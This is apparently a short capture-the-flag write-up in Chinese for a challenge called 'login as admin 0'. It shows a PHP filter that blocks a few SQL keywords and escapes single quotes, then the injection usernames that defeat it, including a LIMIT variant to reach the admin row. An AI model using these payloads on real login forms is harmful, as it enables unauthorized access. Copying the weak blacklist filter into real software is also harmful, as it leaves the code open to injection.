# login as admin 0
```php
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
```
> 提示 SQL Injection!

把 `'` 過濾成 `\\'`，可以試試看利用它  
> username: `admin\' || 1=1#`  
> password: 隨便

發現登入的是 `guest`，嘗試用 `limit`  
> username: `admin\' || 1=1 limit 1,1#`  
> password: 隨便
